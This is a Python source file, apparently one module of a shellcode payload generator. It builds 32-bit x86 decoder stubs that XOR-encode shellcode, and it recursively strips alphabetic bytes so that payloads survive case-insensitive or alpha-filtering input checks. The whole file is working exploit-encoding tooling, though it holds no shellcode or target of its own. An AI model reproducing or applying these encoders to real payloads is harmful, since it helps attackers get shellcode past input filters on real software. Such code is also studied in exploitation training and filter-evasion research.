#!/bin/python3

from payload import *


def xor(shellcode, key):
    key = key & 0xff

    decoder = """
        BITS 32
        jmp short start
        decoder:
        pop esi
        xor ecx, ecx
        process:
        xor byte [esi + ecx], """ + str(key) + """
        inc ecx
        cmp ecx, """ + str(len(shellcode)) + """
        jnz short process
        jmp short next
        start:
        call decoder
        next:"""

    payload = compile_asm(decoder)

    for c in shellcode:
        payload += setbyte(c ^ key)

    return payload


# xor every chars with  1 or 128 to remove maximum of alpha chars
# next we call __remove_alpha__ to remove restant alpha chars
# it can occurs because in the binary some instructions may contain alpha chars
def insensitive_case(shellcode):
    shellcode_xored = b""
    xorarray = ""

    for c in shellcode:
        if c >= 0x80:
            xorarray += "1,"
            shellcode_xored += setbyte(c ^ 1)
        else:
            xorarray += "128,"
            shellcode_xored += setbyte(c ^ 128)

    xorarray = xorarray[:-1]

    decoder = """
        BITS 32
        call start
        xorarray: db """ + xorarray + """
        decoder:
        pop esi
        pop edi
        xor ecx, ecx
        process:
        mov bl, [edi + ecx]
        xor byte [esi + ecx], bl
        inc ecx
        cmp ecx, """ + str(len(shellcode)) + """
        jnz short process
        jmp short next
        start:
        call decoder
        next:"""

    payload = compile_asm(decoder)
    payload += shellcode_xored

    payload = __remove_alpha__(payload, 5) 

    return payload


####################
#  Aux. functions  #
####################

# recursive function : for each alpha char we add an instruction xor
def __remove_alpha__(payload, depth):
    def contains_alpha(string):
        for c in string:
            s = setbyte(c)
            if s.isalpha():
                return True
        return False

    if depth == 0:
        die("max depth reach(5) : payload still contains alpha chars")        
        return payload

    if not contains_alpha(payload):
        return payload

    decoder = """
        BITS 32
        jmp short start
        decoder:
        pop esi
        """

    new_payload = b""
    for i in range(len(payload)):
        s = setbyte(payload[i])
        if s.isalpha():
            # we use mov instruction because "xor byte [esi + CONST]" 
            # generate an alpha char
            decoder += "mov ecx, " + str(i) + "\n"
            decoder += "xor byte [esi + ecx], 128\n"
            new_payload += setbyte(payload[i] ^ 128)
        else:
            new_payload += s

    decoder += """
        jmp short next
        start:
        call decoder
        next:"""

    return __remove_alpha__(compile_asm(decoder) + new_payload, depth-1)

